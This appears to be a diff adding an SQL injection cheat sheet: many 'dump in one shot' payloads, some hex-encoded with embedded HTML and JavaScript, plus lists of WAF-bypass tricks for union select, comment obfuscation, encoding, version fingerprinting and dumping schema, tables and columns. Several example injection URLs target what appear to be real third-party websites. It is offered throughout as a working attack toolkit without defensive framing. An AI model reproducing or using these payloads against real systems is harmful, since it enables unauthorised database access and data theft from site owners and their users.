@@ -1,0 +1,654 @@
+POPULAR DIOS :::
+_____________________
+WAF
+____________________________
+Trojan WAF ::: concat/*!(unhex(hex(concat/*!(0x3c2f6469763e3c2f696d673e3c2f613e3c2f703e3c2f7469746c653e,0x223e,0x273e,0x3c62723e3c62723e,unhex(hex(concat/*!(0x3c63656e7465723e3c666f6e7420636f6c6f723d7265642073697a653d343e3c623e3a3a207e7472306a416e2a2044756d7020496e204f6e652053686f74205175657279203c666f6e7420636f6c6f723d626c75653e28574146204279706173736564203a2d20207620312e30293c2f666f6e743e203c2f666f6e743e3c2f63656e7465723e3c2f623e))),0x3c62723e3c62723e,0x3c666f6e7420636f6c6f723d626c75653e4d7953514c2056657273696f6e203a3a20,version(),0x7e20,@@version_comment,0x3c62723e5072696d617279204461746162617365203a3a20,@d:=database(),0x3c62723e44617461626173652055736572203a3a20,user(),(/*!12345selEcT*/(@x)/*!from*/(/*!12345selEcT*/(@x:=0x00),(@r:=0),(@running_number:=0),(@tbl:=0x00),(/*!12345selEcT*/(0) from(information_schema./**/columns)where(table_schema=database()) and(0x00)in(@x:=Concat/*!(@x, 0x3c62723e, if( (@tbl!=table_name), Concat/*!(0x3c666f6e7420636f6c6f723d707572706c652073697a653d333e,0x3c62723e,0x3c666f6e7420636f6c6f723d626c61636b3e,LPAD(@r:=@r%2b1, 2, 0x30),0x2e203c2f666f6e743e,@tbl:=table_name,0x203c666f6e7420636f6c6f723d677265656e3e3a3a204461746162617365203a3a203c666f6e7420636f6c6f723d626c61636b3e28,database(),0x293c2f666f6e743e3c2f666f6e743e,0x3c2f666f6e743e,0x3c62723e), 0x00),0x3c666f6e7420636f6c6f723d626c61636b3e,LPAD(@running_number:=@running_number%2b1,3,0x30),0x2e20,0x3c2f666f6e743e,0x3c666f6e7420636f6c6f723d7265643e,column_name,0x3c2f666f6e743e))))x)))))*/
+------------------------------------------------------------------
+MadBlod WAF ::: export_set(5,@:=0,(select+count(*)/*!50000from*/+/*!50000information_schema*/.columns+where@:=export_set(5,export_set(5,@,0x3c6c693e,/*!50000column_name*/,2),0x3a3a,/*!50000table_name*/,2)),@,2)
+--------------------------------------
+medblod @x WAF::: +and@x:=concat+(@:=0,(select+count(*)/*!50000from*/information_schema.columns+where+table_schema=database()+and@:=concat+(@,0x3c6c693e,table_name,0x3a3a,column_name)),@)/*!50000UNION*/SELECT+
+--------------------------------
+Zen WAF ::: (/*!12345sELecT*/(@)from(/*!12345sELecT*/(@:=0x00),(/*!12345sELecT*/(@)from(`InFoRMAtiON_sCHeMa`.`ColUMNs`)where(`TAblE_sCHemA`=DatAbAsE/*data*/())and(@)in(@:=CoNCat%0a(@,0x3c62723e5461626c6520466f756e64203a20,TaBLe_nAMe,0x3a3a,column_name))))a)
+---------------------------------
+WAF ::: (/*!50000select*/+concat+(@:=0,(/*!50000select*/+count(*) from+/*!50000information_schema.tables*/+WHERE(TABLE_SCHEMA!=0x696e666f726d6174696f6e5f736368656d61)AND@:=concat+(@,0x3c62723e,/*!50000table_name*/)),@))
+_______________________________________
+Without WAF DIOS
+____________________________
+Medblod ::: (Select+export_set(5,@:=0,(select+count(*)from(information_schema.columns)where@:=export_set(5,export_set(5,@,table_name,0x3c6c693e,2),column_name,0xa3a,2)),@,2))
+-------------------------------------
+T=Pr0 // here database()=database Name  ;;;; (select (@x)from(select(@x:=0x00),(@NR_TAB:=0),(select (0)from(information_schema.tables)where(table_schema=database())and(0x00)in(@x:=concat(@x,0x3c62723e,0x3c62723e,0x3c7370616e207374796c653d22666f6e742d7765696768743a626f6c643b223e,@tbl:=table_name,0x202d2d3e205441424c45204e7220,(@NR_TAB:=@NR_TAB%2b1),0x3c2f7370616e3e,0x3c62723e,0x3c62723e,(@NR_COL:=char(0)),0x3c7370616e207374796c653d22666f6e742d7765696768743a626f6c643b223e434f4c554d53204f46205441424c453c2f7370616e3e3c62723e,(select group_concat((@NR_COL:=@NR_COL%2b1),0x20203a2020,column_name+separator+0x3c62723e)from+information_schema.columns+where+table_schema=Database()+and+table_name=@tbl)))))x)
+------------------------------------
+Dr.Z3r0 :::: (select(select+concat(@:=0xa7,(select+count(*)from(information_schema.columns)where(@:=concat(@,0x3c6c693e,table_name,0x3a,column_name))),@)))
+-------------------------------
+Zen :: make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)
+-------------------------------
+MakMen ::: concat(0x3c7363726970743e6e616d653d70726f6d70742822506c6561736520456e74657220596f7572204e616d65203a2022293b2075726c3d70726f6d70742822506c6561736520456e746572205468652055726c20796f7527726520747279696e6720746f20496e6a65637420616e6420777269746520276d616b6d616e2720617420796f757220496e6a656374696f6e20506f696e742c204578616d706c65203a20687474703a2f2f736974652e636f6d2f66696c652e7068703f69643d2d3420554e494f4e2053454c45435420312c322c332c636f6e6361742830783664363136622c6d616b6d616e292c352d2d2b2d204e4f5445203a204a757374207265706c61636520796f757220496e6a656374696f6e20706f696e742077697468206b6579776f726420276d616b6d616e2722293b3c2f7363726970743e,0x3c623e3c666f6e7420636f6c6f723d7265643e53514c69474f44732053796e746178205620312e30204279204d616b4d616e3c2f666f6e743e3c62723e3c62723e3c666f6e7420636f6c6f723d677265656e2073697a653d343e496e6a6563746564206279203c7363726970743e646f63756d656e742e7772697465286e616d65293b3c2f7363726970743e3c2f666f6e743e3c62723e3c7461626c6520626f726465723d2231223e3c74723e3c74643e44422056657273696f6e203a203c2f74643e3c74643e3c666f6e7420636f6c6f723d626c75653e20,version(),0x203c2f666f6e743e3c2f74643e3c2f74723e3c74723e3c74643e2044422055736572203a203c2f74643e3c74643e3c666f6e7420636f6c6f723d626c75653e20,user(),0x203c2f666f6e743e3c2f74643e3c2f74723e3c74723e3c74643e5072696d617279204442203a203c2f74643e3c74643e3c666f6e7420636f6c6f723d626c75653e20,database(),0x203c2f74643e3c2f74723e3c2f7461626c653e3c62723e,0x3c666f6e7420636f6c6f723d626c75653e43686f6f73652061207461626c652066726f6d207468652064726f70646f776e206d656e75203a203c2f666f6e743e3c62723e,concat(0x3c7363726970743e66756e6374696f6e20746f48657828737472297b76617220686578203d27273b666f722876617220693d303b693c7374722e6c656e6774683b692b2b297b686578202b3d2027272b7374722e63686172436f646541742869292e746f537472696e67283136293b7d72657475726e206865783b7d66756e6374696f6e2072656469726563742873697465297b6d616b73706c69743d736974652e73706c697428222e22293b64626e616d653d6d616b73706c69745b305d3b74626c6e616d653d6d616b73706c69745b315d3b6d616b7265703d22636f6e636174284946284074626c3a3d3078222b746f4865782874626c6e616d65292b222c3078302c307830292c4946284064623a3d3078222b746f4865782864626e616d65292b222c3078302c307830292c636f6e6361742830783363373336333732363937303734336537353732366333643232222b746f4865782875726c292b2232323362336332663733363337323639373037343365292c636f6e63617428636f6e6361742830783363373336333732363937303734336536343632336432322c4064622c307832323362373436323663336432322c4074626c2c3078323233623363326637333633373236393730373433652c30783363363233653363363636663665373432303633366636633666373233643732363536343365323035333531346336393437346634343733323035333739366537343631373832303536323033313265333032303432373932303464363136623464363136653363326636363666366537343365336336323732336533633632373233653534363136323663363532303465363136643635323033613230336336363666366537343230363336663663366637323364363236633735363533652c4074626c2c3078336332663636366636653734336532303636373236663664323036343631373436313632363137333635323033613230336336363666366537343230363336663663366637323364363236633735363533652c4064622c307833633266363636663665373433653363363237323365346537353664363236353732323034663636323034333666366337353664366537333230336132303363363636663665373432303633366636633666373233643632366337353635336533633733363337323639373037343365363336663663363336653734336432322c2853454c45435420636f756e7428636f6c756d6e5f6e616d65292066726f6d20696e666f726d6174696f6e5f736368656d612e636f6c756d6e73207768657265207461626c655f736368656d613d40646220616e64207461626c655f6e616d653d4074626c292c3078323233623634366636333735366436353665373432653737373236393734363532383633366636633633366537343239336233633266373336333732363937303734336533633266363636663665373433652c307833633632373233652c2873656c65637420284078292066726f6d202873656c656374202840783a3d30783030292c284063686b3a3d31292c202873656c656374202830292066726f6d2028696e666f726d6174696f6e5f736368656d612e636f6c756d6e732920776865726520287461626c655f736368656d613d3078222b746f4865782864626e616d65292b222920616e6420287461626c655f6e616d653d3078222b746f4865782874626c6e616d65292b222920616e642028307830302920696e202840783a3d636f6e6361745f777328307832302c40782c4946284063686b3d312c30783363373336333732363937303734336532303633366636633665363136643635323033643230366536353737323034313732373236313739323832393362323037363631373232303639323033643230333133622c30783230292c30783230363336663663366536313664363535623639356432303364323032322c636f6c756d6e5f6e616d652c307832323362323036393262326233622c4946284063686b3a3d322c307832302c30783230292929292978292c30783636366637323238363933643331336236393363336436333666366336333665373433623639326232623239376236343666363337353664363536653734326537373732363937343635323832323363363636663665373432303633366636633666373233643637373236353635366533653232326236393262323232653230336332663636366636653734336532323262363336663663366536313664363535623639356432623232336336323732336532323239336237643363326637333633373236393730373433652c636f6e6361742830783363363233652c307833633733363337323639373037343365373137353635373237393364323232323362363636663732323836393364333133623639336336333666366336333665373433623639326232623239376237313735363537323739336437313735363537323739326236333666366336653631366436353562363935643262323232633330373833323330333336313333363133323330326332323362376437353732366333643735373236633265373236353730366336313633363532383232323732323263323232353332333732323239336236343664373037313735363537323739336437353732366332653732363537303663363136333635323832323664363136623664363136653232326332323238373336353663363536333734323834303239323036363732366636643238373336353663363536333734323834303361336433303738333033303239323032633238373336353663363536333734323032383430323932303636373236663664323832323262363436323262323232653232326237343632366332623232323937373638363537323635323834303239323036393665323032383430336133643633366636653633363137343566373737333238333037383332333032633430326332323262373137353635373237393262323233303738333336333336333233373332333336353239323932393239363132393232323933623634366636333735366436353665373432653737373236393734363532383232336336313230363837323635363633643237323232623634366437303731373536353732373932623232323733653433366336393633366232303438363537323635323037343666323034343735366437303230373436383639373332303737363836663663363532303534363136323663363533633631336532323239336233633266373336333732363937303734336529292929223b75726c3d75726c2e7265706c616365282227222c2225323722293b75726c706173313d75726c2e7265706c61636528226d616b6d616e222c6d616b726570293b77696e646f772e6f70656e2875726c70617331293b7d3c2f7363726970743e3c73656c656374206f6e6368616e67653d22726564697265637428746869732e76616c756529223e3c6f7074696f6e2076616c75653d226d6b6e6f6e65222073656c65637465643e43686f6f73652061205461626c653c2f6f7074696f6e3e,(select (@x) from (select (@x:=0x00), (select (0) from (information_schema.tables) where (table_schema!=0x696e666f726d6174696f6e5f736368656d61) and (0x00) in (@x:=concat(@x,0x3c6f7074696f6e2076616c75653d22,UNHEX(HEX(table_schema)),0x2e,UNHEX(HEX(table_name)),0x223e,UNHEX(HEX(concat(0x4461746162617365203a3a20,table_schema,0x203a3a205461626c65203a3a20,table_name))),0x3c2f6f7074696f6e3e))))x),0x3c2f73656c6563743e),0x3c62723e3c62723e3c62723e3c62723e3c62723e)
+----------------------------------------
+BenchMark () :::: concat(0x3c666f6e7420636f6c6f723d7265643e3c62723e3c62723e7e7472306a416e2a203a3a3c666f6e7420636f6c6f723d626c75653e20,version(),0x3c62723e546f74616c204e756d626572204f6620446174616261736573203a3a20,(select count(*) from information_schema.schemata),0x3c2f666f6e743e3c2f666f6e743e,0x202d2d203a2d20,concat(@sc:=0x00,@scc:=0x00,@r:=0,benchmark(@a:=(select count(*) from information_schema.schemata),@scc:=concat(@scc,0x3c62723e3c62723e,0x3c666f6e7420636f6c6f723d7265643e,LPAD(@r:=@r%2b1,3,0x30),0x2e20,(Select concat(0x3c623e,@sc:=schema_name,0x3c2f623e) from information_schema.schemata where schema_name>@sc order by schema_name limit 1),0x202028204e756d626572204f66205461626c657320496e204461746162617365203a3a20,(select count(*) from information_Schema.tables where table_schema=@sc),0x29,0x3c2f666f6e743e,0x202e2e2e20 ,@t:=0x00,@tt:=0x00,@tr:=0,benchmark((select count(*) from information_Schema.tables where table_schema=@sc),@tt:=concat(@tt,0x3c62723e,0x3c666f6e7420636f6c6f723d677265656e3e,LPAD(@tr:=@tr%2b1,3,0x30),0x2e20,(select concat(0x3c623e,@t:=table_name,0x3c2f623e) from information_Schema.tables where table_schema=@sc and table_name>@t order by table_name limit 1),0x203a20284e756d626572204f6620436f6c756d6e7320496e207461626c65203a3a20,(select count(*) from information_Schema.columns where table_name=@t),0x29,0x3c2f666f6e743e,0x202d2d3a20,@c:=0x00,@cc:=0x00,@cr:=0,benchmark((Select count(*) from information_schema.columns where table_schema=@sc and table_name=@t),@cc:=concat(@cc,0x3c62723e,0x3c666f6e7420636f6c6f723d707572706c653e,LPAD(@cr:=@cr%2b1,3,0x30),0x2e20,(Select (@c:=column_name) from information_schema.columns where table_schema=@sc and table_name=@t and column_name>@c order by column_name LIMIT 1),0x3c2f666f6e743e)),@cc,0x3c62723e)),@tt)),@scc),0x3c62723e3c62723e,0x3c62723e3c62723e)
+-----------------------------------------------------
+Ro0t H3x :::: (select+concat(0x3c666f6e7420666163653d43616d627269612073697a653d323e72306f74404833583439203a3a20,version(),0x3c666f6e7420636f6c6f723d7265643e3c62723e,0x446174616261736573203a7e205b,(Select+count(Schema_name)from(information_Schema.schemata)),0x5d3c62723e5461626c6573203a7e205b,(Select+count(table_name)from(information_schema.tables)),0x5d3c62723e436f6c756d6e73203a7e205b,(Select+count(column_name)from(information_Schema.columns)),0x5d3c62723e,@)from(select(@:=0x00),(@db:=0),(@db_nr:=0),(@tbl:=0),(@tbl_nr:=0),(@col_nr:=0),(select(@)from(information_Schema.columns)where(@)in(@:=concat(@,if((@db!=table_schema),concat((@tbl_nr:=0x00),0x3c666f6e7420636f6c6f723d7265643e,LPAD(@db_nr:=@db_nr%2b1,2,0x20),0x2e20,@db:=table_schema,0x2020202020203c666f6e7420636f6c6f723d707572706c653e207b205461626c6573203a7e205b,(Select+count(table_name)from(information_schema.tables)where(table_schema=@db)),0x5d7d203c2f666f6e743e3c2f666f6e743e),0x00),if((@tbl!=table_name),concat((@col_nr:=0x00),0x3c646976207374796c653d70616464696e672d6c6566743a343070783b3e3c666f6e7420636f6c6f723d626c75653e202020,LPAD(@tbl_nr:=@tbl_nr%2b1,3,0x0b), 0x2e20,@tbl:=table_name,0x20202020203c666f6e7420636f6c6f723d707572706c653e2020207b2020436f6c756d6e73203a7e20205b,(Select+count(column_name)from(information_Schema.columns)where(table_name=@tbl)),0x5d202f203c666f6e7420636f6c6f723d626c61636b3e205265636f726473203a7e205b,(Select+ifnull(table_rows,0x30)+from+information_schema.tables+where+table_name=@tbl),0x5d207d3c2f666f6e743e3c2f666f6e743e3c2f666f6e743e3c2f6469763e),0x00),concat(0x3c646976207374796c653d70616464696e672d6c6566743a383070783b3e3c666f6e7420636f6c6f723d677265656e3e,LPAD(@col_nr:=@col_nr%2b1,3,0x0b),0x2e20,column_name,0x3c2f666f6e743e3c2f6469763e)))))x)
+-------------------------------------------------
+Replace :::: replace(replace(replace(0x232425,0x23,@:=replace(replace(replace(replace(0x243c62723e253c62723e3c666f6e7420636f6c6f723d7265643e263c2f666f6e743e3c62723e3c666f6e7420636f6c6f723d707572706c653e273c2f666f6e743e3c666f6e7420636f6c6f723d7265643e,0x24,0x3c62723e3c62723e3c666f6e7420636f6c6f723d626c61636b3e72306f744048335834393c2f666f6e743e3c666f6e7420636f6c6f723d626c75653e),0x25,version()),0x26,database()),0x27,user())),0x24,(select+count(*)+from+%0Ainformation_schema.columns+where+table_schema=database()+and@:=replace(replace(0x003c62723e2a,0x00,@),0x2a,table_name))),0x25,@)
+--------------------------------------------------
+Ajkaro :::: (select(@x)from(select(@x:=0x00),(@running_number:=0),(@tbl:=0x00),(select(0)from(information_schema.columns)where(table_schema=database())and(0x00)in(@x:=Concat(@x,0x3c62723e,if((@tbl!=table_name),Concat(0x3c2f6469763e,LPAD(@running_number:=@running_number%2b1,2,0x30),0x3a292020,0x3c666f6e7420636f6c6f723d7265643e,@tbl:=table_name,0x3c2f666f6e743e,0x3c62723e,(@z:=0x00),0x3c646976207374796c653d226d617267696e2d6c6566743a333070783b223e), 0x00),lpad(@z:=@z%2b1,2,0x30),0x3a292020,0x3c666f6e7420636f6c6f723d626c75653e,column_name,0x3c2f666f6e743e))))x)
+---------------------------------------------
+Rummy :::::  (select(@x)from(select(@x:=0x00),(select(0)from(information_schema.columns)where(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and(0x00)in(@x:=concat(@x,0x3c74723e3c74643e3c666f6e7420636f6c6f723d7265642073697a653d333e266e6273703b266e6273703b266e6273703b,table_schema,0x266e6273703b266e6273703b3c2f666f6e743e3c2f74643e3c74643e3c666f6e7420636f6c6f723d677265656e2073697a653d333e266e6273703b266e6273703b266e6273703b,table_name,0x266e6273703b266e6273703b3c2f666f6e743e3c2f74643e3c74643e3c666f6e7420636f6c6f723d626c75652073697a653d333e,column_name,0x266e6273703b266e6273703b3c2f666f6e743e3c2f74643e3c2f74723e))))x)
+-------------------------------------------------------------------------
+_____________________________
+Local VAriable::
+_________________________________-
+id=-3'+or@Cyph3r:=make_set(7,@:=0x00,(select(1)/*!50000from*/(/*!50000information_schema*/.Columns)where(Table_Schema!='Information_Schema')and@:=make_set(31,@,'<br>',/*!50000Table_Name*/,'-->',/*!50000Column_name*/)),@)/*!50000UniON*/select   
+
+>>>> [ on the vulnerbale column write  {  concat('version:::'version(),'<br>',' ::Inj3ct3d By B3nG4L_Cyph3r::<br>',@Cyph3r)    }]  
+------------------------------------------------
+id=-3' +and@x:=(/*!50000SELECT+*/GROUP_CONCAT(/*!50000table_name*/,0x2d2d2d3e,/*!50000column_Name*/+SEPARATOR+0x3c62723e)/*!50000FROM+*//*!50000INFORMATION_SCHEMA*/.ColumnS WHERE TABLE_SCHEMA=DATABASE/**!**/())
+
+>>>> [ on the vulnerbale column, write  {  concat('version:::'version(),'<br>',' ::Inj3ct3d By B3nG4L_Cyph3r::<br>',@x)  }]
+
+--------------------------------------
+
+SQLI Injction WAF Bypass Methods With Details
+--'- : +--+ / : -- - : --+- : /*
+) order by 1-- -
+') order by 1-- -
+')order by 1%23%23
+%')order by 1%23%23
+Null' order by 100--+
+Null' order by 9999--+
+')group by 99-- -
+'group by 119449-- -
+'group/**/by/**/99%23%23
+union select ByPassing method
++union+distinct+select+
++union+distinctROW+select+
+/**//*!12345UNION SELECT*//**/
+/**//*!50000UNION SELECT*//**/
++/*!50000UnIoN*/ /*!50000SeLeCt aLl*/+
++/*!u%6eion*/+/*!se%6cect*/+
+/**/uniUNIONon/**/aALLll/**/selSELECTect/**/
+1%')and(0)union(select(1),version(),3,4,5,6)%23%23%23
+/*!50000%55nIoN*/+/*!50000%53eLeCt*/
+union /*!50000%53elect*/
+%55nion %53elect
++--+Union+--+Select+--+
++UnIoN/*&a=*/SeLeCT/*&a=*/
+id=1+’UnI”On’+'SeL”ECT’
+id=1+'UnI'||'on'+SeLeCT'
+UnIoN SeLeCt CoNcAt(version())--
+uNiOn aLl sElEcT
+uUNIONnion all sSELECTelect
+===================================================================================================================================
+:: Buffer Overflow ::
+===================================================================================================================================
++And(select 1)=(select 0×414)+union+select+1–
++And(select 1)=(select 0xAAAA)+union+select+1–
++And(select 1)=(select 0×4141414141414141414141414141414141414141414141414141414141414141414141414 14141414141414141414141414141414141414141414141414141414141414141414141414141414 14141414141414141414141414141414141414141414141414141414141414141414141414141414 14141414141414141414141414141414141414141414141414141414141414141414141414141414 14141414141414141414141414141414141414141414141414141414141414141414141414141414 14141414141414141414141414141414141414141414141414141414141414141414141414141414 14141414141414141414141414141414141414141414141414141414141414141414141414141414 14141414141414141414141414141414141414141414141414141414141414141414141414141414 14141414141414141414141414141414141414141414141414141414141414141414141414141414 1414141)+
++and (/*!select*/ 1)=(/*!select*/ 0xAA)+
+==================================================================================================================================
+:: 400 Bad Request ::
+==================================================================================================================================
+–+%0A
+union+select+1–+%0A,2–+%0A,3–+%0A,4–+%0A,5–+%0A –
+==================================================================================================================================
+null the parameter
+==================================================================================================================================
+id=-1
+id=null
+id=1+and+false+
+id=9999
+id=1 and 0
+id==1
+id=(-1)
+=======================================================================================================================================
+Group_Concat
+=======================================================================================================================================
+Group_Concat
+group_concat()
+/*!group_concat*/()
+grOUp_ConCat(/*!*/,0x3e,/*!*/)
+group_concat(,0x3c62723e)
+g%72oup_c%6Fncat%28%76%65rsion%28%29,%22~BlackRose%22%29
+CoNcAt()
+CONCAT(DISTINCT Version())
+concat(,0x3a,)
+concat%00()
+%00CoNcAt()
+/*!50000cOnCat*/(/*!Version()*/)
+/*!50000cOnCat*/
+/**//*!12345cOnCat*/(,0x3a,)
+concat_ws()
+concat(0x3a,,0x3c62723e)
+/*!concat_ws(0x3a,)*/
+concat_ws(0x3a3a3a,version()
+CONCAT_WS(CHAR(32,58,32),version(),)
+REVERSE(tacnoc)
+binary(version())
+uncompress(compress(version()))
+aes_decrypt(aes_encrypt(version(),1),1)
+====================================================================================================================================
+To appear column numbr in page put after id
+====================================================================================================================================
+id=1+and+1=0+union+select+1,2,3,4,5,6
++AND+1=0
+/*!aND*/ 1 like 0
++/*!and*/+1=0
++and+2>3+
++and(1)=(0)
+and (1)!=(0)
++div+0
+Having+1=0
+===================================================================================================================================
+function ByPassing
+===================================================================================================================================
+unhex(hex(value))
+cast(value as char)
+uncompress(compress(version()))
+cast(version() as char)
+aes_decrypt(aes_encrypt(version(),1),1)
+binary(version())
+convert(value using ascii)
+===================================================================================================================================
+avoid source page injection
+===================================================================================================================================
+concat(?”>,
+,@@version,?
+“>
+?
+injection
+concat(0x223e,@@version)
+concat(0x273e27,version(),0x3c212d2d)
+concat(0x223e3c62723e,version(),0x3c696d67207372633d22)
+concat(0x223e,@@version,0x3c696d67207372633d22)
+concat(0x223e,0x3c62723e3c62723e3c62723e,@@version,0x3c696d67207372633d22,0x3c62723e)
+concat(0x223e3c62723e,@@version,0x3a,”BlackRose”,0x3c696d67207372633d22)
+concat(‘’,@@version,’’)
+concat(0x273c2f7469746c653e27,@@version,0x273c7469746c653e27)
+concat(0x273c2f7469746c653e27,version(),0x273c7469746c653e27)
+===================================================================================================================================
+get version – DB_NAME – user – HOST_NAME – datadir
+===================================================================================================================================
+version()
+convert(version() using latin1)
+unhex(hex(version()))
+@@GLOBAL.VERSION
+(substr(@@version,1,1)=5) :: 1 true 0 fals
+# like #
+http://www.marinaplast.com/page.php?id=-13 union select 1,2,(substr(@@version,1,1)=5),4,5 –
+==================================================================================================================================
++and substring(version(),1,1)=4
++and substring(version(),1,1)=5
++and substring(version(),1,1)=9
++and substring(version(),1,1)=10
+id=1 /*!50094aaaa*/ error
+id=1 /*!50095aaaa*/ no error
+id=1 /*!50096aaaa*/ error
+# like # http://www.marinaplast.com/page.php?id=13 /*!50095aaaa*/
+id=1 /*!40123 1=1*/–+- no error
+id=1 /*!40122rrrr*/ no error
+# like # http://www.marinaplast.com/page.php?id=13 /*!40122rrrr*/ error not v4
+=================================================================================================================================
+DB_NAME()
+=================================================================================================================================
+@@database
+database()
+id=vv()
+# like # http://www.marinaplast.com/page.php?id=-13 union select 1,2,DB_NAME(),4,5 –
+http://www.marinaplast.com/page.php?id=vv()
+@@user
+user()
+user_name()
+system_user()
+# like # http://www.marinaplast.com/page.php?id=-13 union select 1,2,user(),4,5 –
+HOST_NAME()
+@@hostname
+@@servername
+SERVERPROPERTY()
+# like # http://www.marinaplast.com/page.php?id=-13 union select 1,2,HOST_NAME(),4,5 –
+@@datadir
+datadir()
+# like # http://www.marinaplast.com/page.php?id=-13 union select 1,2,datadir(),4,5 –
+ASPX
+and 1=0/@@version
+‘ and 1=0/@@version;–
+‘) and 1=@@version–
+and 1=0/user;–
+Requested method
+[DUMP DB in 1 Request]
+(select (@) from (select(@:=0×00),(select (@) from (information_schema.columns) where (table_schema>=@) and (@)in (@:=concat(@,0x0a,’ [ ',table_schema,' ] >’,table_name,’ > ‘,column_name))))x)
+(select(@) from (select (@:=0×00),(select (@) from (table) where (@) in (@:=concat(@,0x0a,column1,0x3a,column2))))a)
+===================================================================================================================================
+[DUMP DB in 1 Request improve]
+===================================================================================================================================
+(select(@x)from(select(@x:=0×00),(select(0)from(information_schema.columns)where(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and(0×00)in(@x:=concat(@x,0x3c62723e,table_schema,0x2e,table_name,0x3a,column_name))))x)
+like
+http://www.marinaplast.com/page.php?id=-13 union select 1,2,(select(@x)from(select(@x:=0×00),(select(0)from(information_schema.colu mns)where(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and(0×00)in(@x:=c oncat(@x,0x3c62723e,table_schema,0x2e,table_name,0x3a,column_name))))x),4,5 –
+===================================================================================================================================
+#2#
+===================================================================================================================================
+method like DUMP DB in 1 Request
+===================================================================================================================================
+concat(@i:=0×00,@o:=0xd0a,benchmark(40,@o:=CONCAT( @o,0xd0a,(SELECT concat(table_schema,0x2E,@i:=table_name) FROM information_schema.tables WHERE table_name>@i order by table_name LIMIT 1)))
+like
+http://www.mishnetorah.com/shop/details.php…(@i:=0×00,@o:=0xd0a,benchmark(40,@o:=CONCAT(@o,0xd0a ,(SELECT concat(table_schema,0x2E,@i:=table_name) FROM information_schema.tables WHERE table_name>@i order by table_name LIMIT 1))),@o),5,6,7,8,9,10, 11,12,13,14,15,16,17,18,19,20,21
+===================================================================================================================================
+#3#
+===================================================================================================================================
+databases
+(select+count(schema_name) +from+information_schema.schemata)
+# like #
+http://www.marinaplast.com/page.php?id=-13 union select 1,2,(select+count(schema_name) +from+information_schema.schemata),4,5 –
+tables
+(select+count(table_name) +from+information_schema.tables)
+# like #
+http://www.marinaplast.com/page.php?id=-13 union select 1,2,(select+count(table_name) +from+information_schema.tables),4,5 –
+columns
+(select+count(column_name) +from+information_schema.columns)
+# like #
+http://www.marinaplast.com/page.php?id=-13 union select 1,2,(select+count(column_name) +from+information_schema.columns),4,5 –
+===================================================================================================================================
+#4#
+===================================================================================================================================
+show the table with all her columns
+CONCAT(table_name,0x3e,GROUP_CONCAT(column_name))
++FROM information_schema.columns WHERE table_schema=database() GROUP BY table_name LIMIT 1,1–+
+like
+http://www.marinaplast.com/page.php?id=-13 union select 1,2,CONCAT(table_name,0x3e,GROUP_CONCAT(column_name)),4,5 +FROM information_schema.columns WHERE table_schema=database() GROUP BY table_name LIMIT 0,1–+
+===================================================================================================================================
+#5#WWWWWWWWWWWAAAAAAAAAAAAAAAAAAFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF
+===================================================================================================================================
+feltered requested
+# tables #
+group_concat(/*!table_name*/)
++/*!froM*/ /*!InfORmaTion_scHema*/.tAblES– -
+/*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/=schEMA()– -
+/*!From*/+%69nformation_schema./**/tAblES+/*!50000Where*/+/*!%54able_ScHEmA*/=schEMA()– -
+===================================================================================================================================
+# columns #
+===================================================================================================================================
+group_concat(/*!column_name*/)
++/*!froM*/ InfORmaTion_scHema.cOlumnS /*!WheRe*/ /*!tAblE_naMe*/=hex table
+/*!From*/+%69nformation_schema./**/columns+/*!50000Where*/+/*!%54able_name*/=hex table
+/*!froM*/ table– -
+===================================================================================================================================
+#6#
+===================================================================================================================================
+bypass method
+(select+group_concat(/*!table_name*/)+/*!From*/+%69nformation_schema./**/tAblES+/*!50000Where*/+/*!%54able_ScHEmA*/=schEMA())
+(select+group_concat(/*!column_name*/)+/*!From*/+%69nformation_schema./**/columns+/*!50000Where*/+/*!%54able_name*/=hex table)
+like
+http://www.marinaplast.com/page.php?id=-13 union select 1,2,(select+group_concat(/*!table_name*/)+/*!From*/+%69nformation_schema./**/tAblES+/*!50000Where*/+/*!%54able_ScHEmA*/=schEMA()),4,5 –
+===================================================================================================================================
+#7#
+===================================================================================================================================
+bypass method
+unhex(hex(Concat(Column_Name,0x3e,Table_schema,0x3e,table_Name)))
+/*!from*/information_schema.columns/*!where*/column_name%20/*!like*/char(37,%20112,%2097,%20115,%20115,%2037)
+like
+http://www.marinaplast.com/page.php?id=-13 union select 1,2,unhex(hex(Concat(Column_Name,0x3e,Table_schema,0x3e,table_Name))),4,5 /*!from*/information_schema.columns/*!where*/column_name%20/*!like*/char(37,%20112,%2097,%20115,%20115,%2037)–
+===================================================================================================================================
+[+] Union Select:
+===================================================================================================================================
+union /*!select*/+
+union/**/select/**/
+/**/union/**/select/**/
+/**/union/*!50000select*/
+/**//*!12345UNION SELECT*//**/
+/**//*!50000UNION SELECT*//**/
+/**/uniUNIONon/**/selSELECTect/**/
+/**/uniUNIONon/**/aALLll/**/selSELECTect/**/
+/**//*!union*//**//*!select*//**/
+/**/UNunionION/**/SELselectECT/**/
+/**//*UnIOn*//**//*SEleCt*//**/
+/**//*U*//*n*//*I*//*O*//*n*//**//*S*//*E*//*l*//*e*//*C*//*t*//**/
+/**/UNunionION/**/all/**/SELselectECT/**/
+/**//*UnIOn*//**/all/**//*SEleCt*//**/
+/**//*U*//*n*//*I*//*O*//*n*//**//*all*//**//*S*//*E*//*l*//*e*//*C*//*t*//**/
+uni
+%20union%20/*!select*/%20
+union%23aa%0Aselect
+union+distinct+select+
+union+distinctROW+select+
+/*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/
+%252f%252a*/UNION%252f%252a /SELECT%252f%252a*/
+%23sexsexsex%0AUnIOn%23sexsexsex%0ASeLecT+
+/*!50000UnIoN*/ /*!50000SeLeCt aLl*/+
+/*!u%6eion*/+/*!se%6cect*/+
+1%’)and(0)union(select(1),version(),3,4,5,6)%23%23%23
+/*!50000%55nIoN*/+/*!50000%53eLeCt*/
+union /*!50000%53elect*/
++%2F**/+Union/*!select*/
+%55nion %53elect
++–+Union+–+Select+–+
++UnIoN/*&a=*/SeLeCT/*&a=*/
+uNiOn aLl sElEcT
+uUNIONnion all sSELECTelect
+union(select(1),2,3)
+union (select 1111,2222,3333)
+union (/*!/**/ SeleCT */ 11)
+%0A%09UNION%0CSELECT%10NULL%
+/*!union*//*–*//*!all*//*–*//*!select*/
